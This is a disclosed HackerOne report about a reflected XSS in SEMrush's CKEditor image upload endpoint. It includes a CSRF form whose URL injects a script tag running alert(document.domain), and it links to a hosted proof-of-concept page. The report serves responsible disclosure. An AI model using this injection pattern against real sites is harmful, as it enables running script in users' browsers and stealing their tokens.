@@ -1,0 +1,51 @@
+ReportLink:https://hackerone.com/reports/375352
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/apapedulimu
+ReportedTo:SEMrush(semrush)
+BountyAmount:100.0
+Severity:low
+State:Closed
+DateOfDisclosure:17.08.2018 13:08:41
+
+Summary:
+
+**Summary:** 
+XSS Via Post Method When Upload via CKEditor
+
+**Description:** 
+This XSS is execute by error message when upload some image on 
+
+```
+https://www.semrush.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=0&langCode=en
+```
+
+## Browsers Verified In:
+
+  * Firefox
+
+## Steps To Reproduce:
+
+- This is POST based XSS, need some csrf to trigger the xss
+- Create .html code like : 
+
+```
+<html>
+  <body>
+    <form action="https://www.semrush.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=dadasd</script><script>alert(document.domain)</script>&langCode=en" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+- and click the submit request 
+- Or go to http://labs.apapedulimu.click/xss-semrush.html 
+
+## Supporting Material/References:
+{F314582}
+
+## Impact
+
+XSS Will be execute it when user click that button, and attacker can stole user token, IP & etc.
+
+Regards,
+Apapedulimu
